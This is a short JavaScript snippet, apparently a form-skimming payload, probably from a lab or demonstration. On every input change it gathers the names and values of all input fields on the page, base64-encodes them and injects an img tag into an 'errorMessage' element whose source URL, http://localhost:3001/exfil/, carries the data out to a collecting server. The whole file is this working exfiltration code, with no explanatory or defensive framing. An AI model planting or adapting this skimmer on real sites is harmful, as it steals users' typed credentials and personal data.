const inputs = document.getElementsByTagName('input');

for (let i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener('change', function() {
        const values = {};

        for (let i = 0; i < inputs.length; i++) {
            values[inputs[i].name] = inputs[i].value
        }

        const data = JSON.stringify(values)

        document.getElementById('errorMessage').innerHTML = `<img src="http://localhost:3001/exfil/${window.btoa(data)}" />`
    })
}